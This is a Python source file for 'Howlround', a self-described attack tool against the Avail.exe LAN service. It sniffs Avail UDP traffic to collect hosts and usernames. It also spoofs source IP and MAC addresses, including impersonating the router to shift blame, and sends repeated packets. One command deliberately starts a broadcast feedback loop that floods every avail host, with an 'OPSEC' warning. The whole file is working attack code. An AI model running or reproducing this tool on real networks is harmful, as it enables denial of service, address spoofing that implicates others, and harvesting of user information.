import argparse
import cmd
import scapy.all
import threading
import psutil
import os
import sys
import socket
import base64
import hashlib
import ipaddress
import time

# Process:
# 1. Take in command line inputs for interface to use and what interface mode to use.
# 2. Retrieve information about interface, and attempt to activate the interface in the following order for modes:
#    SCAPY_RAW (0) -> PYTHON_BROADCAST (1) -> PYTHON_UNICAST (2)
# 2b. If SCAPY_RAW was activated, start a secondary socket for reciving UDP transmissions.
# 2c. If the PYTHON_* was activated, determine if we can send out broadcasts. If not, we're in mode 2.
# 3. Start a thread in background to log packets from Avail.exe, and then give control to the user.

AParse = argparse.ArgumentParser(description="Howlround: A program to abuse avail.exe")
AParse.add_argument("interface", help="What interface should we listen/run on?", type=str)
AParse.add_argument("--mode", help="What mode should we activate the interface in? 0 -> SCAPY_RAW, 1 -> PYTHON_BROADCAST, 2 -> PYTHON_UNICAST", default=0, type=int, choices=[0, 1, 2])
AParse.add_argument("--ipv6", help="Use")
AParse.add_argument("-v", help="Be more verbose", default=False, action="store_true", dest="verbose")
AParse.add_argument("--ip", help="Ignore wrong port", default=False, action="store_true", dest="ignorewrongport")
AParse.add_argument("--is", help="Ignore wrong size", default=False, action="store_true", dest="ignorewrongsize")

Args = vars(AParse.parse_args())


def VerbosePrint(*message: str):
    if Args["verbose"]:
        print(*message)


# Let's collect the needed information about our chosen interface.
# We'll use net_if_addrs here.
try:
    ChosenInterfaceInformation = psutil.net_if_addrs()[Args["interface"]]
except KeyError:
    print("The selected interface does not exist")
    sys.exit(1)
InterfaceInformation = {}
AddrFamUsed = []
AddrFams = []
for x in ChosenInterfaceInformation:
    if x.family == socket.AF_PACKET:
        InterfaceInformation["MAC"] = x.address
        InterfaceInformation["MAC_Broadcast"] = x.broadcast
        continue
    if x.family in [socket.AF_INET, socket.AF_INET6]:
        AddrFams.append([x.family, x.address, x.netmask, x.broadcast])
if len(AddrFams) == 0:
    print("Can't find a compatible address family on interface.")
    sys.exit(1)
elif len(AddrFams) == 1:
    AddrFamUsed = AddrFams[0]
else:
    print("Multiple addresses on interface found. Please select the one to use.")
    counter = 0
    for x in AddrFams:
        print(counter, "=>", x)
        counter += 1
    while True:
        try:
            AddrFamUsed = AddrFams[int(input("?> "))]
            break
        except Exception as E:
            if isinstance(E, (ValueError, IndexError, EOFError)):
                print("Invalid selection.")
                continue
            raise E
if AddrFamUsed[0] == socket.AF_INET6:
    # IPv6 has depreicated Broadcast. So we will attempt to use Link-local multicast address ("ff02::1")
    AddrFamUsed[3] = "ff02::1"
InterfaceInformation["Family"] = AddrFamUsed[0]
InterfaceInformation["IP"] = AddrFamUsed[1]
InterfaceInformation["Netmask"] = AddrFamUsed[2]
InterfaceInformation["Broadcast"] = AddrFamUsed[3]
# Okay, we now have the needed information. Spin our listener first.
ListenSocket = socket.socket(InterfaceInformation["Family"], socket.SOCK_DGRAM)
ListenSocket.bind((InterfaceInformation["IP"], 54321))
SendSocket = None
# We'll attempt to spin up our SCAPY_RAW interface first, if asked to.
if Args["mode"] == 0:
    VerbosePrint("Will attempt making a raw interface.")
    try:
        SendSocket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        # If it works, we have successfully started an interface in raw mode! Bind our NIC.
        SendSocket.bind((Args["interface"], 0))
        VerbosePrint("Success! We're running in SCAPY_RAW mode.")
    except Exception as E:
        if isinstance(E, (PermissionError, OSError)):
            VerbosePrint("An error occured while trying to bind:", str(E))
            print("Couldn't bind in SCAPY_RAW mode, will attempt PYTHON_BROADCAST mode.")
            # Set Mode to 1.
            SendSocket = ListenSocket
            Args["mode"] = 1
        else:
            raise E
if Args["mode"] == 1:
    VerbosePrint("Will attempt to set SO_BROADCAST to 1 on our Send/Listen Socket")
    try:
        SendSocket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        VerbosePrint("Success! We're running in PYTHON_BROADCAST MODE.")
    except Exception as E:
        if isinstance(E, (PermissionError, OSError)):
            VerbosePrint("An error occured while trying to elevate to broadcast mode: ", str(E))
            if InterfaceInformation["Family"] != socket.AF_INET6:
                print("Couldn't bind in PYTHON_BROADCAST mode, stuck with PYTHON_UNICAST mode.")
                Args["mode"] = 2
            else:
                print("Ignoring error, it is possible that AF_INET6 doesn't allow 'broadcast mode' per say, but Multicast still works.")
        else:
            raise E
# We now have our two sockets and the InterfaceInformation. Spawn our thread.


class ThreadedListener(threading.Thread):
    def __init__(self, ListeningSocket: socket.socket):
        super().__init__()
        self._ListenSock = ListeningSocket
        self._AvailHosts = {}
        self._StopSignal = threading.Lock()
        self._ListenSock.settimeout(0.1)

    def run(self):
        while not self._StopSignal.locked():
            try:
                InData, InAddr = self._ListenSock.recvfrom(65535)
            except socket.timeout:
                InData, InAddr = (None, None)
            if InData is None:
                continue
            if InAddr[1] != 54321 and not Args["ignorewrongport"]:
                VerbosePrint("Host %s sent a packet from the wrong port, %d. Ignoring" % InAddr)
                continue
            if len(InData) > 4 and not Args["ignorewrongsize"]:
                VerbosePrint("Host %s sent a packet of size %d that didn't match normal Avail.exe behaviour. Ignoring" % (InAddr[0], len(InData)))
                continue
            if len(InData) > 100:
                VerbosePrint("Host %s sent a packet of size over 100, which Avail.exe can't take. Ignoring." % (InAddr[0]))
                continue
            try:
                Username = InData.decode() + "..."
            except UnicodeDecodeError:
                Username = base64.b16encode(InData).decode()
            Hasher = hashlib.sha256()
            Hasher.update(InAddr[0].encode() + b":" + str(InAddr[1]).encode())
            KeyName = "AVAIL-" + base64.b16encode(Hasher.digest()).decode()[0:16:]
            if KeyName not in list(self._AvailHosts.keys()):
                VerbosePrint("New avail host found: %s:%d" % InAddr)
                self._AvailHosts[KeyName] = {"AddrInfo": InAddr, "Usernames": []}
            if Username not in self._AvailHosts[KeyName]["Usernames"]:
                VerbosePrint("New user on host found: %s@%s:%d" % (Username, InAddr[0], InAddr[1]))
                self._AvailHosts[KeyName]["Usernames"].append(Username)
        self._ListenSock.close()


ListenerThread = ThreadedListener(ListenSocket)
ListenerThread.start()


# And now, let's spawn our CMD shell.
class CMDShell(cmd.Cmd):
    def __init__(self):
        super().__init__()
        self.intro = """
Welcome to Howlround, avail.exe attack-tool.
Type help or ? to list possible commands.
For any IP address value, "SAME" will be the same as your own IP address.
"BROADCAST" will be the network broadcast address.
"""
        self.prompt = "HR>"
        self._blamemac = False

    def ParseArgs(self, arg):
        return arg.split()

    def VerifyIP(self, ip):
        try:
            IPTemp = socket.gethostbyname(ip)
            ipaddress.ip_address(IPTemp)
            return True
        except Exception as E:
            if isinstance(E, (ValueError, socket.gaierror)):
                return False
            raise E

    def FindHostMAC(self, ip):
        if not self.VerifyIP(ip):
            raise ValueError("Couldn't find target.")
        OutMAC = scapy.all.getmacbyip(ip)
        if OutMAC is None:
            try:
                ARP_Res = scapy.all.arping(ip)[0][0][1]
                return ARP_Res[1].hwsrc
            except IndexError:
                raise ValueError("Couldn't find target.")
        return OutMAC

    def SendPacket(self, src="SAME", dst="BROADCAST"):
        # Check what mode we're in. The mode will determine if we attempt to send it in Scapy or regular.
        OutData = os.urandom(64)
        IPNet = ipaddress.ip_network(InterfaceInformation["IP"] + "/" + InterfaceInformation["Netmask"], strict=False)
        if src in ["BROADCAST", InterfaceInformation["Broadcast"]] and dst not in ["SAME", "BROADCAST", InterfaceInformation["IP"], InterfaceInformation["Broadcast"]]:
            if ipaddress.ip_address(dst) not in IPNet:
                raise ValueError("dst address is not within the local segment, this can't possibily work.")
        if src not in ["SAME", InterfaceInformation["IP"]] and Args["mode"] != 0:
            raise ValueError("Can't spoof src, since we couldn't bind as SCAPY_RAW.")
        if dst in ["BROADCAST", InterfaceInformation["Broadcast"]] and Args["mode"] > 1:
            raise ValueError("Can't send to broadcast, since we could only bind to PYTHON_UNICAST")
        if src == "SAME":
            src = InterfaceInformation["IP"]
        elif src == "BROADCAST":
            src = InterfaceInformation["Broadcast"]
        if dst == "SAME":
            dst = InterfaceInformation["IP"]
        elif dst == "BROADCAST":
            dst = InterfaceInformation["Broadcast"]
        if Args["mode"] == 0:
            # We're in SCAPY_RAW mode. We can utitlize Scapy's functions for this.
            # Ether: Discover SRC and DST.
            if src == InterfaceInformation["IP"] or (InterfaceInformation["Broadcast"] and not self._blamemac):
                SRC_MAC = InterfaceInformation["MAC"]
            if src == InterfaceInformation["Broadcast"] and self._blamemac:
                # We will attempt to find the router, and spoof it.
                RouterIP = scapy.all.conf.route.route()[2]
                SRC_MAC = self.FindHostMAC(RouterIP)
            else:
                # Check if BlameMAC is enabled. If it is, we will discover the orignal SRC mac address and use that.
                if self._blamemac:
                    # Attempt to discover SRC, we will use FindHostMAC
                    SRC_MAC = self.FindHostMAC(src)
                else:
                    SRC_MAC = InterfaceInformation["MAC"]
            # DST
            if dst == InterfaceInformation["IP"]:
                DST_MAC = InterfaceInformation["MAC"]
            elif dst == InterfaceInformation["Broadcast"]:
                DST_MAC = InterfaceInformation["MAC_Broadcast"]
            else:
                # Attempt to discover DST, we will use FindHostMAC
                DST_MAC = self.FindHostMAC(dst)
            # Building Ethernet Layer.
            EtherLayer = scapy.all.Ether(src=SRC_MAC, dst=DST_MAC)
            # IP, well we kinda already have the needed information in src and dst.
            # Check Address Family and build the IP layer based on that.
            if InterfaceInformation["Family"] == socket.AF_INET:
                IPLayer = scapy.all.IP(src=src, dst=dst)
            else:
                IPLayer = scapy.all.IPv6(src=src, dst=dst)
            # Build the packet.
            OutPack = EtherLayer / IPLayer / scapy.all.UDP(sport=54321, dport=54321) / os.urandom(64)
            OutData = OutPack.build()
            SendSocket.sendall(OutData)
        else:
            # Just perform VerifyIP, we can't really do much here.
            if not self.VerifyIP(src) or not self.VerifyIP(dst):
                raise ValueError("Invalid SRC/DST")
            SendSocket.sendto(OutData, (dst, 54321))

    def SafeHandleSendData(self, src="SAME", dst="BROADCAST"):
        try:
            return self.SendPacket(src, dst)
        except Exception as E:
            raise E
            print("An error occured while processing your input. %s: %s" % (type(E), str(E)))

    def do_sendpacket(self, arg):
        """
        sendpacket <DST IP address>: Send a UDP packet to DST IP Address
        """
        FuncArgs = self.ParseArgs(arg)
        self.SafeHandleSendData(src="SAME", dst=FuncArgs[0])

    def DangerFormula(self, StartingNumber):
        NumberCopy = StartingNumber
        try:
            for x in ["bytes", "kilobytes", "megabytes", "gigabytes", "terabytes", "petabytes", "exabytes", "zettabytes", "yottabytes", "WTFbytes"]:
                print(f"{NumberCopy} {x} per second...")
                NumberCopy = NumberCopy / 1024.0
                if NumberCopy <= 1:
                    break
        except OverflowError:
            print("infinity yottabytes per second... (OVERFLOW ERROR! WHAT ARE YOU DOING!? >:( ))")
            return

    def do_spoofpacket(self, arg):
        """
        spoofpacket <SRC IP address> <DST IP address> <Pulse>: Spoof a UDP packet from SRC IP address to DST IP address. Optionally, repeat for every "pulse" interval.
        """
        FuncArgs = self.ParseArgs(arg)
        if len(FuncArgs) < 2:
            print("Expected two arguments")
            return
        PulseFrequency = 0
        if len(FuncArgs) == 3:
            PulseFrequency = int(FuncArgs[2])
        NumberOfHosts = len(list(ListenerThread._AvailHosts.keys()))
        if NumberOfHosts == 0:
            NumberOfHosts = ipaddress.ip_network(InterfaceInformation["IP"] + "/" + InterfaceInformation["Netmask"], strict=False).num_addresses - 2
        if FuncArgs[0] == "BROADCAST" and FuncArgs[1] == "BROADCAST":
            print("WARNING! YOU'RE ABOUT TO DO SOMETHING VERY DANGEROUS!")
            print("If you try to execute this, every avail host will attempt to talk to each other as a result of a feedback loop.")
            print(f"If all {NumberOfHosts} hosts on this network had avail running and can respond to each request within a second, you are about to generate...")
            BytesPerSecond = 46**(NumberOfHosts)
            self.DangerFormula(BytesPerSecond)
            print("(This doesn't take account of any hosts that have not been picked up by this tool.)")
            if not self._blamemac:
                print("BlameMAC is also not turned on, THIS OPERATION IS NOT OPSEC SAFE.")
            print("LAST CHANCE: DO YOU REALLY WANT TO DO THIS!?")
            while True:
                try:
                    Answer = input("y/N>")
                except EOFError:
                    Answer = ""
                if Answer == "":
                    Answer = "n"
                if Answer.lower() in ["y", "ye", "yes"]:
                    print("Alright, don't winge at me if you get in trouble for using the necular option... :/")
                    break
                elif Answer.lower() in ["n", "no"]:
                    print("Okay, returning to main menu.")
                    return
                else:
                    print("THAT'S NOT AN ANSWER!")
                    continue
        self.SafeHandleSendData(src=FuncArgs[0], dst=FuncArgs[1])
        if PulseFrequency >= 0.1:
            print(f"Pulsing for every {PulseFrequency} second.")
            try:
                while True:
                    time.sleep(PulseFrequency)
                    self.SafeHandleSendData(src=FuncArgs[0], dst=FuncArgs[1])
            except KeyboardInterrupt:
                print("Stopping...")
                return

    def do_blamemac(self, arg):
        """
        blamemac <on/off>: Toggle the BlameMAC function, which controls whenever Howlround should spoof a MAC address if given a IP address that does not match our own.
        """
        FuncArgs = self.ParseArgs(arg)
        if len(FuncArgs) == 0:
            print("Current state: %s" % ("On" if self._blamemac else "Off"))
            return
        if FuncArgs[0].lower() not in ["on", "off"]:
            print("Expected On/Off.")
            return
        self._blamemac = (True if FuncArgs[0].lower() == "on" else False)

    def do_print_hosts(self, arg):
        """
        print_hosts: Print all seen avail hosts.
        """
        print("----- Seen hosts -----")
        for x, y in ListenerThread._AvailHosts.items():
            print(f'{x}@{"%s:%d" % y["AddrInfo"]}: {", ".join(y["Usernames"])} ')
        return

    def do_clear_hosts(self, args):
        """
        clear_hosts: Clear the seen hosts list.
        """
        ListenerThread._AvailHosts = {}

    def do_quit(self, arg):
        """
        quit: Exits Howlround. Pressing CTRL+D will also do the same.
        """
        raise KeyboardInterrupt

    do_EOF = do_quit


CMDInstance = CMDShell()
try:
    CMDInstance.cmdloop()
except KeyboardInterrupt:
    print("Bye bye!")
    ListenerThread._StopSignal.acquire()
    if Args["mode"] == 0:
        SendSocket.close()
    sys.exit(0)
